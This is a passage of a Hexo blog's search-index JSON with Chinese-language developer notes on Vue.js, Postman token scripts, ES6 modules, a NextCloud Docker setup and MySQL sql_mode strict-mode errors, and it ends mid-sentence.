vuejs的table場景特效可以用`<tbody>`\n[transition-group is not working on tables · Issue #3907 · vuejs/vue](https://github.com/vuejs/vue/issues/3907)\n\n8. 到底讓子元件做ajax查詢資料，還是讓父類別做ajax查詢，說真的感覺component做ajax比較好做，但是感覺寫在父層對component自由度會比較大\n但相對\n目前覺得很死component(只查某一類東西)在component做會比較好\n~~不然data binding雙向綁定會搞死人，vue-router又不能使用v-once~~\n我現在才想到我是不是因為用`v-model`關係\n才導致雙向綁定，也許我該用`v-bind:value`才對  orz\n\n\n\n9. input[type=radio]在使用vue data binding，用`JSON.parse(JSON.stringify(xxxx))`轉出物件做bind好像會有問題，後來有想到用computed做，但還沒測試。\n\n10. router-view到底該不該寫event事件呢?我看很多範例都沒有這樣寫，不知道該寫event bus跟vuex哪個比較好，但是vuex還沒學，我想router搞熟在學會比較好\n\n以上有些疑問可能要復仇名單(我有記得的話，再回來改)\n\n總結\n\n這次code寫的很糟糕，感覺有很多地方可以改進\n也了解寫template沒有用`vue cli`真的很痛苦\n就像寫筆記本沒亮度提示，真的很傷眼睛XD\n\nrouter 串大量參數感覺真的很不方便，難道真的要靠vuex解決?\n有空研究一下還有什麼方法，閉包解法真的不是很好看\n\n感覺`<component is=\"xxx\">`和vue-router比起來\n可以做到`頁籤分頁`功能，我想唯一的是vue-router有做到回上一頁功能\n說真的這個真的很方便\n\n但網頁上寫commponent真的很痛苦\n難道該跳cli了XD\n\n最後突然想到component有一個keep-alive\n就在想router有沒有這玩意\n[vue-router 之 keep-alive - 简书](https://www.jianshu.com/p/0b0222954483)\n\n最後又想到event問題，官方文件沒有提到\n但我實作一下，好像可以用\n","tags":["vue"],"categories":["Javascript"]},{"title":"蒐集一些網頁波浪動態圖示","url":"%2Fblog%2F2018%2F09%2F26%2F%E8%92%90%E9%9B%86%E4%B8%80%E4%BA%9B%E7%B6%B2%E9%A0%81%E6%B3%A2%E6%B5%AA%E5%8B%95%E6%85%8B%E5%9C%96%E7%A4%BA%2F","content":"\n最近想做出一種波浪特效\n所以有找一些網路上現有的資源\n\n<!--more-->\n\n* [SVG+JS驱动的波浪动画 - Yoomin的前端学习笔记 - SegmentFault 思否](https://segmentfault.com/a/1190000005182219)\n[DEMO](http://jsbin.com/lobirezuza/edit?html,js,output)\n這個效果不是我要的...\n裡面有相關貝茲曲線說明[深度掌握SVG路径path的贝塞尔曲线指令 « 张鑫旭-鑫空间-鑫生活](https://www.zhangxinxu.com/wordpress/2014/06/deep-understand-svg-path-bezier-curves-command/)\n\n* [canvas圆形进度球html5水波动画特效 - 素材火](http://www.sucaihuo.com/js/1927.html)\n用canvas繪製波浪出來\n這個波浪很好看\n但是...Canvas我不熟，其實我不需要外框\n所以放棄orz\n\n* [svg波浪动画 - caoxuejun - SegmentFault 思否](https://segmentfault.com/a/1190000010627039)\n[DEMO](http://jsbin.com/nakotofahi/edit?html,js,output)\n這個適用SVG模擬出來的\n\n* [纯 CSS 实现波浪效果！ - ChokCoco - 博客园](https://www.cnblogs.com/coco1s/p/7197662.html)\n介紹一堆波浪方法，但我找不到我要的\n\n\n* [使用 SVG 轻松实现波浪 (wave) 动画效果 - 前端 - 掘金](https://juejin.im/entry/58d86b751b69e6006bbb02fb)\n[demo地址](https://link.juejin.im/?target=http%3A%2F%2Fcodepen.io%2Fjanily%2Fpen%2FKWBPvx)\n這個原本很棒，但我不能調整...\n\n\n* [javascript - 想实现360的波浪进度球效果 - SegmentFault 思否](https://segmentfault.com/q/1010000010980206)\n[DEMO網址](https://jsfiddle.net/og2b4jwx/)\n把wrapper拿掉border-radius之後\n就是我要的方形  QQ\n感動\n\n\n找的過程，挖到不錯的文\n* [chokcoco/iCSS: 谈谈一些有趣的 CSS 话题](https://github.com/chokcoco/iCSS)\n* [安卓自定义View进阶-Path之贝塞尔曲线](http://www.gcssloop.com/customview/Path_Bezier)\n\n\n發現做個特效，數學可能真的很重要orz\n\n\n最後採用[javascript - 想实现360的波浪进度球效果 - SegmentFault 思否](https://segmentfault.com/q/1010000010980206)\n放在我現在我做的番茄鐘(暫時)\n\n{% asset_img 1.gif 放上去特效 %}\n{% asset_link \"TheBackground.vue\" 套用在Vue範例檔 %}\n\n\n\n","tags":["波浪"],"categories":["網頁特效"]},{"title":"vscode套件Rest Client搭配JSON-Server簡單使用小記","url":"%2Fblog%2F2018%2F09%2F25%2Fvscode%E5%A5%97%E4%BB%B6Rest-Client%E6%90%AD%E9%85%8DJSON-Server%E7%B0%A1%E5%96%AE%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98%2F","content":"\n最近vscode挖到Rest Client套件\n這個有點類似postman\n可以直接簡單做Server溝通\n簡單測試外，感覺還可以順便寫文件XD\n但功能好像有點多，所以我就沒玩很深入\n\n<!--more-->\n\n## JSON-Server\n\n首先可以先裝JSON-Server\n\n```\nnpm install -g json-server\n```\n\n設定`db.json`(注意:一定要xxx.json)\n```json\n{\n    \"posts\":[]\n}\n```\n\n存檔\n```\njson-server db.json\n```\n\n簡單就架好一個Restful 測試Server XD\n想說要模擬分頁、搜尋沒辦法做到\n結果一看他的文件\n竟然可以做到[typicode/json-server: Get a full fake REST API with zero coding in less than 30 seconds (seriously) #paginate](https://github.com/typicode/json-server#paginate)\n最近要練VueJS\n剛好可以用這個練習\n\n**NOTE 2018/09/26**\n`json-server db.json --static .`可設定`index.html`可以直接連http://localhost/index.html\n\n## REST Client\n\n`###`用來當分格線\n\n```\n###\n# 取得資料\nGET http://localhost:3000/posts\n\n\n# Content-Type 可以參考\n# [四种常见的 POST 提交数据方式 | JerryQu 的小站](https://imququ.com/post/four-ways-to-post-data-in-http.html)\n### 新增資料\n\nPOST http://localhost:3000/posts  HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\ntest=2&a=1\n\n\n#  傳JSON，一定要加content-type: application/json 一定要填寫，不然會錯\n###\n# 新增資料\nPOST http://localhost:3000/posts  HTTP/1.1\ncontent-type: application/json\n\n{\n    \"test\" : 2\n}\n\n###\n# PUT 更新資料\nPUT http://localhost:3000/posts/1  HTTP/1.1\ncontent-type: application/json\n\n{\n    \"test2\" : \"3\"\n}\n\n###\n# DELETE 刪除資料\nDELETE http://localhost:3000/posts/1  HTTP/1.1\ncontent-type: application/json\n\n{\n    \"test2\" : \"3\"\n}\n\n```\n\n\n{% asset_img 1.png \"查詢請按紅框\" %}\n\n[Huachao/vscode-restclient: REST Client Extension for Visual Studio Code](https://github.com/Huachao/vscode-restclient)\n功能真的太多了...\n\n\n{% asset_link vscode套件Rest-Client搭配JSON-Server簡單使用小記.zip 範例檔案 %}"},{"title":"Postman 使用pre-request Script抓token範例","url":"%2Fblog%2F2018%2F09%2F25%2Fpostman-%E4%BD%BF%E7%94%A8pre-request-Script%E6%8A%93token%E7%AF%84%E4%BE%8B%2F","content":"\n最近同事使用postman抓資料，都需要抓取token所以都需要多一個步驟\n所以我就找找有什麼可以不用一直做重複的事情\n最後有用出來，但不常用這一定要做一下筆記\n<!--more-->\n首先，Postman有一個很重要的功能[Variables](https://www.getpostman.com/docs/v6/postman/environments_and_globals/variables)\n這個變數可以方便設定\n於是我在想有什麼方法可以透過Script幫我做抓token，然後設定到`變數`裡面去\n\n```javascript\nvar client_id = 'xxxxx';\nvar client_secret = 'OOOOOO';\n\n\nvar words = CryptoJS.enc.Utf8.parse(client_id + ':' + client_secret);\nvar base64 = CryptoJS.enc.Base64.stringify(words);\nconsole.log('Basic' + base64);\n\n\npm.sendRequest({\n    url: 'https://xxxx.com',\n    method: 'POST',\n    header: 'Authorization: Basic ' + base64,\n    body: {\n        mode: 'urlencoded',\n            urlencoded: [\n                    { key: \"scope\", value: \"/main/v1\"},\n                    { key: \"grant_type\", value: \"client_credentials\" },\n            ]\n    }\n}, function (err, res) {\n    console.log(res.json());\n    var token = res.json().access_token;\n    \n    pm.environment.set('token','Bearer ' + token);\n    \n});\n```\n\n\n{% asset_img 1.jpg \"放code位置\" %}\n\n\n## refresh token \n\n[Refresh Token的使用場景以及如何與JWT互動 | 程式前沿](https://codertw.com/%E5%89%8D%E7%AB%AF%E9%96%8B%E7%99%BC/2049/)","tags":["postman"],"categories":["實用工具"]},{"title":"ECMAScript6 Module使用筆記","url":"%2Fblog%2F2018%2F09%2F22%2FECMAScript6-Module%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98%2F","content":"\n最近因為學了VueJS，覺得事時候要進入Vue cli環境用用看\n但知道Vue cli是使用Webpack\n總覺得不了解JS模組化要怎麼寫\n之後程式會踩到一堆雷\n在此先記錄一些筆記\n\n<!--more-->\n\n在之前有看過nodejs的`require`，JavaScript的`import xxxx from ooo`\n一直以為他們都是大同小意，可能可以互通\n但今天看到這篇[Node中没搞明白require和import，你会被坑的很惨 - 腾讯Web前端 IMWeb 团队社区 | blog | 团队博客](http://imweb.io/topic/582293894067ce9726778be9)\n{% asset_link 1.png \"備份圖\" %}\n發現完全不一樣\n\n由於我對COMMONJS、AMD跟nodejs不熟悉\n所以我這篇指記錄ECMAScript 6 模組化\n\n## (模組)導出 \n```javascript\nexport var a = 1;\nvar b = 2;\nexport b;\nexport 1;//不能放不是變數，只能放function name跟object指定\n```\n\n詳細:[export - JavaScript | MDN](https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Reference/Statements/export)\n\n### export default\n```javascript \n// 底下的 function 用 class, function* 也可以\nexport default expression;\nexport default function (…) { … } \nexport default function name1(…) { … }\n```\n一個JS只能放一個export default\n\n在寫模組導入的時候\n在說明會比較清楚\n\n基本上export會解析後面放的變數名稱\n\n`export {xxxx, oooo,ffff}`\n當export放物件(大陸翻:對象，最近看中文一直看不懂這詞XD)\n\n\n```javascript\nexport { name1 as default, … };\nexport * from …;\nexport { name1, name2, …, nameN } from …;\nexport { import1 as name1, import2 as name2, …, nameN } from …;\n```\n\n> 另外要注意的是，如果想 import 的同時 export 出去，\n> 並?不會 export 預設輸出。\n```\nexport * from …;\n```\n> 你必須額外 import 它的預設輸出，然後再用 export\n```\nimport mod from \"mod\";\nexport default mod;\n```\n\n## (模組)導入\n\n如果我們要輸出單獨的 function, object, class 或當做 fallback 值來輸出的話，就可以用預設輸出：\n\n```javascript\n// module \"my-module.js\"\nexport default function cube(x) {\n  return x * x * x;\n}\nexport var b = 1;\n```\n外部檔案的 import 用法：\n```javascript\nimport cube from 'my-module';\nimport {b} from 'my-module';\nconsole.log(cube(3)); // 27\n```\nNote 注意預設輸出不能使用 var, let , const。\n\n比較要注意的事情\n`import`後面有沒有`{}`就不一樣了\n`{}`裡面是放export 變數名稱\n沒有的話，import xxx，xxx是指default導出的東西\n\n\n\n## HTML載入\n```html\n<script type=\"module\" src=\"a.js\"></script>\n```\n現在Server都支援了ES6載入模組\n當然要實驗看看\n\n\n## 小小實驗\n### HFS踩坑記，無法載入\n\n在公司用hfs不能開啟，但用xxamp可以直行\n但是在家裡hfs又可以用了...\n\n\n\n\n### 兩個export物件會怎麼樣\n\n這是我想的，好奇這樣能不能跑\n```\nexport {xxxx,oooo}\nexport {zzzz,yyyy}\n```\n\n\n### b.js\n```js\nexport {a,b}\nexport {c,d}\n// export {a,c,d}\n// SyntaxError: duplicate export name 'a'\n```\n\n詳細下載{% asset_link \"jsModule.7z\" 我寫的東西 %}\n\n\n題外話\n```\nexport {b}; // 这是ES6的写法，实际上就是{b:b}\n```\n原本以為文章寫錯\n剛好邊看直播[[ Alex 宅幹嘛 ] 👨‍💻Vue 全家桶與 RESTful API 串接入門介紹 Part 2 - YouTube](https://www.youtube.com/watch?v=aYlihfn-Gmg)\n有題到這個是ES6語法 XD","tags":["ecmascript6"],"categories":["JavaScript"]},{"title":"Vue.js簡易筆記","url":"%2Fblog%2F2018%2F09%2F19%2FVue-js%E7%B0%A1%E6%98%93%E7%AD%86%E8%A8%98%2F","content":"\n最近使用Vue.js寫幾個範例\n先做個備忘錄\n\n<!--more-->\n\n{% asset_link vuetest.code 筆記連結 %}\n\n了解完可以看下面的影片，可以更進一步了解vuejs\n如物件、陣列、virtual DOM... 等等雷\n[[Vue.js 台灣 Meetup] Style Guide 導讀 / Kuro Hsu - YouTube](https://www.youtube.com/watch?v=K8k5mkl-w4g)\nEventBus的雷，刪除component記得做回收動作\n[[ Alex 宅幹嘛 ] 👨‍💻Vue EventBus 使用操作與外掛開發 - YouTube](https://www.youtube.com/watch?v=eFtw__i7vOk)\n還算滿好懂的過場教學\n[Vue.js (14) - 過場效果及動畫 | Tony Blog](http://blog.tonycube.com/2017/06/vuejs-14-transition-animation.html?m=1)\n{% asset_link 2.png \"備份圖\" %}\n有講sync跟emit的差別，其實原理都一樣，但是sync是寫死的，不用多寫東西\n[【Vue】Vue中的父子组件通讯以及使用sync同步父子组件数据 - 外婆的彭湖湾 - 博客园](http://www.cnblogs.com/penghuwan/p/7473375.html)\n{% asset_link 1.png \"備份圖\" %}\n\nlive server跟json server的reload坑 (NOTE:liveServer.setttings.ignoreFiles)\nhttps://youtu.be/MCTETw0Slrw?t=1h21m51s\n\n\nvue cli electron \n[remote | Electron 中文文档](https://wizardforcel.gitbooks.io/electron-doc/content/api/remote.html)\n[nklayman/vue-cli-plugin-electron-builder: A Vue Cli 3 plugin for Electron with no required configuration](https://github.com/nklayman/vue-cli-plugin-electron-builder)\n[remote | Electron](https://electronjs.org/docs/api/remote#remotegetcurrentwindow)","tags":["vue"],"categories":["Vue"]},{"title":"Java操作POI修改報表sample檔發生信任活頁簿問題","url":"%2Fblog%2F2018%2F09%2F18%2FJava%E6%93%8D%E4%BD%9CPOI%E4%BF%AE%E6%94%B9%E5%A0%B1%E8%A1%A8sample%E6%AA%94%E7%99%BC%E7%94%9F%E4%BF%A1%E4%BB%BB%E6%B4%BB%E9%A0%81%E7%B0%BF%E5%95%8F%E9%A1%8C%2F","content":"\n最近使用Java做報表，產生出來資料正確\n但開啟會跳出奇怪的東西\n後來是要開rar把一個資料刪除sample檔就順利\n簡單紀錄\n\n<!--more-->\n\n程式報表處理是這樣的\n\n1. 讀取Excel SAMPLE檔案\n2. 寫入Excel資料\n3. 另存新檔到xxxx.xlsx\n\n今天就是改Excel  SAMPLE檔案存檔\n程式順利執行執行\n但是跳出錯誤訊息\n\n\n{% asset_img 1.jpg \"Excel 錯誤訊息1\" %}\n{% asset_img 2.jpg \"Excel 錯誤訊息2\" %}\n\n雖然會自動修復...，但每次產生新報表這樣也很麻煩\n\n{% asset_img 3.jpg \"用rar開啟sample.xlsx檔案刪除calcChain.xml\" %}\n用rar開啟sample.xlsx檔案刪除calcChain.xml\n後來副理跟我說要故這個才能解決。\n\n不知道是什麼原因才造成的\n先筆記","tags":["POI"],"categories":["寫程式一些事"]},{"title":"NextCloud 使用docker簡易安裝筆記","url":"%2Fblog%2F2018%2F09%2F16%2FNextCloud-%E4%BD%BF%E7%94%A8docker%E7%B0%A1%E6%98%93%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98%2F","content":"NextCloud 使用docker簡易安裝筆記\n\n<!--more-->\n```\ndocker  run  -d  -p  8000:80   nextcloud\n```\n\n就可以簡單使用NextCloud\n\n```\ndocker  run -d  -v  /mnt/HD1/nextcloud_bk:/var/www/html -p  8000:80 nextcloud\n```\n當然要備份資料可以掛載，我有試著掛載`~/data/owncolud.db`好像沒有作用\n在想應該還有其他設定檔\n\n它還有很特別功能，竟然有檔案版本控制\n我沒玩過NAS，不知道是不是這是NAS基本功能\n{% asset_img 01.png %}\n\n\n家裡有一台Raspberry PI，它被用來當動物機，常常追番用的\n平常傳資料我都是在window開hfs去傳的，有時候覺得跑來跑去很麻煩\n還在想它可以怎麼跟Raspbery PI用\n\n## elementary OS client設定\n\n{% asset_img 1.png  %}\n\n```\nsudo add-apt-repository ppa:nextcloud-devs/client\nsudo apt-get update\n```\n這樣就能安裝 nextcloud-client \n```\nsudo apt-get install nextcloud-client\n```\n\n{% asset_img 2.png  %}\n\n{% asset_img 3.png  %}\n\n{% asset_img 4.png \"沒有申請憑證，當然要點第2個選項\" %}\n\n可惜...，當天講者電腦icon有同步圖示，elementary OS好像看不到QQ\n\n後來安裝nautilus跟nautilus-nextcloud，然後登入再登入之後就能看到nautilus有圖示功能了\n```\nsudo apt-get install nautilus nautilus-nextcloud\n```\n原生elementary os 檔案管理工具沒有套件....\n{% asset_img files_icons.png  %}\n\n找個播放器來試試\n\n##  安裝audio player\n\n可用上面搜尋快速找到你要的套件\n{% asset_img 001.png  %}\n\n{% asset_img 002.png \"這邊不能用localhost連線，要用127.0.0.1(本機的話)\" %}\n{% asset_img 003.png  %}\n{% asset_img 004.png  %}\n{% asset_img 005.png  %}\n{% asset_img 006.png  %}\n{% asset_img 007.png  %}\n\n別對搜尋中按鈕騙了...，害我等了快30分鐘...(我還以為壞掉了)\n*請記得要點「搜尋中」他才會真的搜尋!!!*\n\n後來還發現還有markdown套件!!!\n\n# 假如區網可能會遇到非安全網域的問題\n\n假如你有root權限，直接做volumes資料夾那邊設定\n沒的話要`docker exec -ti xxxx bash`進去改\n\n我沒看文件，加入 `1 => '*',`\n竟然能跑XD\n有對外開放IP，不建議這樣設定\n指定比較安全\n\n{% asset_img config.png  %}\n\n\n參考來源:\n[講者簡報](http://bit.ly/sakana20180915)\n[講者blog](http://sakananote2.blogspot.com/)\n[Promethues](https://docs.google.com/presentation/d/1aZzPbmhYfa51MsoK4FskQPeoIL6AqMXVzW5eQRiTfhw/edit#slide=id.g426e3e8d8f_1_0)\n[Ubuntu 安裝教學](https://www.techrepublic.com/article/how-to-install-the-nextcloud-client-on-ubuntu/)\n\n\n## 意外升級搞壞(2021-01-10)\n\n今天用[Nextcloud Security Scan](https://scan.nextcloud.com/)掃我 nextcloud 弱點\n發現版本稍微舊\n[ownyourbits/nextcloudpi - Docker Hub](https://hub.docker.com/r/ownyourbits/nextcloudpi)\n想說 `docker pull ownyourbits/nextcloudpi` 這樣更新\n重啟新的 container 就可以了\n誰知道 MariaDB 不能用了\n\n不知道是不是之前版本是 MySQL 關係\n於是我只能重啟重建之路\n\n先假設我有使用 traefik \n所以我的 80 443 port 都被占用\n\n這次我採取使用 docker-compose 來做\n\n** 以下我用1.34.1 操作還是有問題**\n有看到有人降到 1.31 就能正常使用\n好像後面有大改版，畫面首頁有調整\n\n1.34.1\n[Docker volume does not contain user data - ℹ️ Support / 📦 Appliances (Docker, Snappy, VM, NCP) - Nextcloud community](https://help.nextcloud.com/t/docker-volume-does-not-contain-user-data/101808/25)\n重點好像有bug，docker hub 好像沒這個版本\n所以去 Git 上面抓下來編譯\n\n```sh\nsudo apt update\nsudo apt install jq\n\ngit clone https://github.com/nextcloud/nextcloudpi.git  # 預設就是 1.34.1\ngit checkout v1.31\ncd nextcloudpi\n./build-docker.sh armhf\n```\n\n\n[nextcloudpi/docker-compose-armhf.yml at master · nextcloud/nextcloudpi · GitHub](https://github.com/nextcloud/nextcloudpi/blob/master/docker-compose-armhf.yml)\n```yml\nversion: \"3\"\n\nservices:\n  nextcloudpi:\n#    image:  ownyourbits/nextcloudpi\n#    後來發現 nextcloudpi 有 nextcloudpi-armhf image\n    image: ownyourbits/nextcloudpi-armhf\n    command: \"192.168.1.x\"\n    networks:\n        - traefik_network\n    labels:\n      - \"traefik.backend=ncp\"\n      - \"traefik.http.routers.ncp.rule=Host(`xxxx.duckdns.org`)\"\n      - \"traefik.http.routers.ncp.tls=true\"\n      - \"traefik.http.services.ncp.loadbalancer.server.port=80\"\n    restart: always\n    ports:\n      - \"1180:80\" # 暫時使用，traefik 可以註解調\n      - \"11443:443\" # 暫時使用，traefik 可以註解調\n      - \"4443:4443\"\n    volumes:\n      - /media/USBdrive/ncp2:/data\n      - /etc/localtime:/etc/localtime:ro\n\nnetworks:\n  traefik_network:\n    external: true\n\n```\n\n\n因為我用 Traefik 轉 https 關係\n所以我要把 Force HTTPS 給關掉\nnc-trust-domain 把 192.168.1.202 加進去\n\nhttps://192.168.1.202:11443 就能用 ncp 進去\n我通常會建立新的 admin 帳號給自己\n\n要把舊的檔案一進去\n\n```sh\ndocker-compose exec nextcloudpi bash\n\ncd /data/nextcloud/\n\nsudo -u www-data php occ files:scan --all\n\n```\n\n~~新版檔案路徑在 `/data-ro/nextcloud/data/xxuser/files`~~ 1.43.1 bug??\n\n上傳大量檔案推薦使用 WinSCP 上傳\n可以參考:[Harry 程式筆記: [WinSCP] sftp下使用sudo上傳檔案](https://harry-lin.blogspot.com/2019/05/winscp-sftpsudo.html)\n怎麼使用 winscp? 可以參考我這篇 [WinSCP 用 sudo 上傳檔案的方法(含切換一般使用者) | 程式狂想筆記](https://malagege.github.io/blog/2020/01/10/WinSCP%20%E7%94%A8%20sudo%20%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88%E7%9A%84%E6%96%B9%E6%B3%95/)\n\nhttps://192.168.1.x:4443/?app=nc-scan-auto\n\n可以馬上執行\n\n通常60分會讀一次\n\n暫時收工\n\n**2021-05-10**\n\n還是不想透過用指令方法去實作\ntraefik 上傳多個 MP3 會有問題(可能樹梅派做這些動作 loading 還是太重了)\n想透過 sftp 上傳 權限用 www-data\n本來想掛個sftp\n但我又不想用www-data為帳號\n``\ngit clone \n\ncd sftp \n\ndocker build . -t rpi-sftp\n\ndocker run -p 2223:22 -d rpi-sftp miles:123456:33:33:upload -v\n```\n\n[[Docker] 使用 Docker 建置 FTP(SFTP) 環境 - Miles's Journey](https://mileslin.github.io/2020/02/%E4%BD%BF%E7%94%A8-Docker-%E5%BB%BA%E7%BD%AE-FTP-SFTP-%E7%92%B0%E5%A2%83/)\n\n\n[Nextcloud](https://hrbhot.github.io/posts/nextcloud/)\n[nextcloud ntfs权限问题及解决方法-β1ùe](https://b1ue.me/archives/183)\n[Docker安装nextcloud以及遇到的一下问题和优化方法 - 烦fpy](https://www.fanfpy.top/index.php/archives/68/)\n\n\n[阿就操場啊~: 使用者在Linux, BSD切換群組](https://2formosa.blogspot.com/2020/10/change-group-on-UNIX-like-system.html)\n\n\n我後來使用  `usermod -a -G www-data pi`\n這樣我就可以執接sftp放檔案進去\nwww-data也能刪檔案\n\n\n[linuxserver/nextcloud - LinuxServer.io](https://docs.linuxserver.io/images/docker-nextcloud)\n\n改umask\n\n~~`-e UMASK=022`~~\n沒效...，看來新建資料夾比較麻煩\n[How to change Default Umask Permission in Linux](https://www.computernetworkingnotes.com/rhce-study-guide/how-to-change-default-umask-permission-in-linux.html)","tags":["nextcloud"],"categories":["Docker"]},{"title":"Truncated incorrect DOUBLE value: '785+712' 和 Java JDBC預設sql_mode為嚴格模式","url":"%2Fblog%2F2018%2F09%2F10%2FTruncated-incorrect-DOUBLE-value-785-712-%E5%92%8C-Java-JDBC%E9%A0%90%E8%A8%ADsql-mode%E7%82%BA%E5%9A%B4%E6%A0%BC%E6%A8%A1%E5%BC%8F%2F","content":"\n\n最近遇到一些MySQL地雷，要好好好整理一下\n正常DB已經設定非嚴格模式\n今天遇到Java執行遇到Warning不會過\nSQL執行如insert xxxx .....  select xxx ....\n語法也沒有錯\nphpmyadmin可以執行\njava執行就是過不了\n```\n2018-09-05 09:45:10,428 ERROR {Thread-0} [xxxxx.rbt.client.lib.Function] : insertMusicBoxReportLog com.mysql.jdbc.MysqlDataTruncation: Data truncation: Truncated incorrect DOUBLE value: '785+712'\n```\n這就非常讓我疑惑\n\n<!--more-->\n\n首先，先研究這個錯誤問題\nhttps://com-it.tech/archives/170855\n才過一天...，網站就掛掉了 {% asset_link webbackup.png \"google cache備份\" %}\n剛剛注意到下面有原網址[小心MySQL的隐式类型转换陷阱 | Sean's Notes](http://seanlook.com/2016/05/05/mysql-type-conversion/)\n\n\n```\nselect '1aa1'=='1'\n```\n就會出現這個問題\n好像自動轉型會發生狀況\n產生**Warning**\n\n\nJDBC不管怎麼樣，預設會自動開啟嚴格模式\n> spring.datasource.url=jdbc:mysql://localhost:3306/conweb?sessionVariables=sql_mode='NO_ENGINE_SUBSTITUTION'&jdbcCompliantTruncation=false\n爬到stackoverflow找到這篇[java - com.mysql.jdbc.MysqlDataTruncation: Data truncation: Data too long for column 'column_name' - Stack Overflow](https://stackoverflow.com/questions/13567155/com-mysql-jdbc-mysqldatatruncation-data-truncation-data-too-long-for-column-c)\n\n看到可以設定sql_mode就有不好的預感\n\n>根据“三、重要的SQL_MODE值”，因而可以获知，使用JDBC Driver作为Mysql Client，碰到\"inserting an incorrect value into a column\"的情况的时候，会抛出ERROR，而不是WARNING\nJDBC Driver默认会设置会话SQL_MODE='STRICT_TRANS_TABLES'的原因是：\"enforce JDBC compliance on truncation checks\"需要开启\"STRICT_TRANS_TABLES\"这个SQL_MODE，而在JDBC URL中存在着\"jdbcCompliantTruncation\"这个参数，该参数可以控制是否开启\"enforce JDBC compliance on truncation checks\"功能，当我们通过JDBC URL设定\"jdbcCompliantTruncation=false\"之后，也就不会去默认设置SQL_MODE='STRICT_TRANS_TABLES'了\n最後找到這個確認[Mysql的SQL_MODE - CSDN博客](https://blog.csdn.net/dslztx/article/details/47176549)\n\n\n{% asset_img sql.jpg 錯誤訊息 %}\n原本不想動測試DB資料，後來還是手動把`785+712`資料拿掉就正常執行了\n\n\n**2019-11-25**\n\n建立 table 時後 column 欄位建議要 `NULL`\n最近踩了一個雷，因為公司內部有兩個DB 做同步，一個用嚴格模式、一個不是\n導致另一個嚴格模式資料沒有進來\n\nsql_mode 用 Dbeaver 查詢結果跟 phpmyadmin 不一樣???\n後來發現跟上次跟 Java 一樣採到一樣的雷\n有些 client 會自動幫你設定 sql_mode\n要使用 `SHOW GLOBAL VARIABLES LIKE 'sql_mode';` 會比較準\n\n```sql\nSELECT @@sql_mode;\n-- STRICT_TRANS_TABLES,NO_ENGINE_SUBSTITUTION    for dbeaver\n-- NO_ENGINE_SUBSTITUTION  for phpmyadmin\n\nSHOW GLOBAL VARIABLES LIKE 'sql_mode';\n-- NO_ENGINE_SUBSTITUTION\n\n```\n\n非嚴警模式下，Level Warning 層級不會跳錯誤\n在非嚴警模式下可以 `SHOW WARNINGS` 看到資料\n[MySQL :: MySQL 5.7 Reference Manual :: 5.1.10 Server SQL Modes](https://dev.mysql.com/doc/refman/5.7/en/sql-mode.html#sql-mode-strict)\n```\nStrict SQL Mode\nStrict mode controls how MySQL handles invalid or missing values in data-change statements such as INSERT or UPDATE. A value can be invalid for several reasons. For example, it might have the wrong data type for the column, or it might be out of range. A value is missing when a new row to be inserted does not contain a value for a non-NULL column that has no explicit DEFAULT clause in its definition. (For a NULL column, NULL is inserted if the value is missing.) Strict mode also affects DDL statements such as CREATE TABLE. \n```\n\n裡面都寫得很清楚\n[MySQL :: MySQL 5.7 Reference Manual :: 13.1.18 CREATE TABLE Statement](https://dev.mysql.com/doc/refman/5.7/en/create-table.html)\n[MySQL :: MySQL 5.7 Reference Manual :: 13.2.5 INSERT Statement](https://dev.mysql.com/doc/refman/5.7/en/insert.html)\n可以搜尋 strict 關鍵字找\n改table 欄位大寫也跟 sql_mode有關係\n\n[MySQL alter table modify column failing at rows with null values - Stack Overflow](https://stackoverflow.com/questions/7828440/mysql-alter-table-modify-column-failing-at-rows-with-null-values)\n[MySQL刪除重複資料 @ Nightmare的胡言亂語 :: 痞客邦 ::](https://nsysumis94.pixnet.net/blog/post/22022962)\n\n參考來源\n[MySQL 中数据类型的默认值 - default 约束 - MySQL 拾遗 - 简单教程，简单编程](https://www.twle.cn/c/yufei/mysqlfav/mysqlfav-basic-data-type-default.html)\n[MySQL sql_mode 说明（及处理一起 sql_mode 引发的问题） - Sean's Notes - SegmentFault 思否](https://segmentfault.com/a/1190000005936172)\n[被 MySQL sql_mode 深深伤害（ 上 ） - MySQL 拾遗 - 简单教程，简单编程](https://www.twle.cn/c/yufei/mysqlfav/mysqlfav-basic-sql_mode.html)\n[被 MySQL sql_mode 深深伤害（ 中 ） - MySQL 拾遗 - 简单教程，简单编程](https://www.twle.cn/c/yufei/mysqlfav/mysqlfav-basic-sql_mode2.html)\n[被 MySQL sql_mode 深深伤害（ 下 ） - MySQL 拾遗 - 简单教程，简单编程](https://www.twle.cn/c/yufei/mysqlfav/mysqlfav-basic-sql_mode3.html)\n\n彩蛋\n[Data View and Format · dbeaver/dbeaver Wiki · GitHub](https://github.com/dbeaver/dbeaver/wiki/Data-View-and-Format)\n[Data migration · dbeaver/dbeaver Wiki · GitHub](https://github.com/dbeaver/dbeaver/wiki/Data-migration)","tags":["sql"],"categories":["SQL"]},{"title":"遇到Data truncated for column 'd' at row 和改sql_mode那些事","url":"%2Fblog%2F2018%2F09%2F01%2F%E9%81%87%E5%88%B0Data-truncated-for-column-d-at-row-%E5%92%8C%E6%94%B9sql-mode%E9%82%A3%E4%BA%9B%E4%BA%8B%2F","content":"\n最近公司報表出問題了\n繼上次DB還原[MySQL在Linux下預設有分大小寫和Incorrect integer value: '' for column 'num' 問題 | 程式狂想筆記](https://malagege.github.io/blog/2018/08/28/MySQL%E5%9C%A8Linux%E4%B8%8B%E9%A0%90%E8%A8%AD%E6%9C%89%E5%88%86%E5%A4%A7%E5%B0%8F%E5%AF%AB%E5%92%8CIncorrect-integer-value-for-column-num-%E5%95%8F%E9%A1%8C/)，有些設定跑掉\n這次出現這個`Data truncated for column 'd' at row`\n因為重新設定還原sql_mode是嚴格模式...\n\n<!--more-->\n\n為什麼這次會出現`Incorrect integer value: '' for column 'num'`\n不知道這次也是Excel匯入也出現`Data truncated for column 'd' at row `\n為什麼有不一樣的結果呢??\n發現帶入空字串輸入到double會發這種事情...\n導致可能前人寫的Excel匯入會有狀況\n\n有簡單用docker hub pwd(play with docker)測試\n{% asset_img error.jpg title %}\n\n簡單記錄測試紀錄\n再開嚴格模式\n`'1'`都可以正常存入，但前後多不明空白會不能寫入\n但沒開嚴格模式時候\n`' 1'`不能正常寫入\n`'1 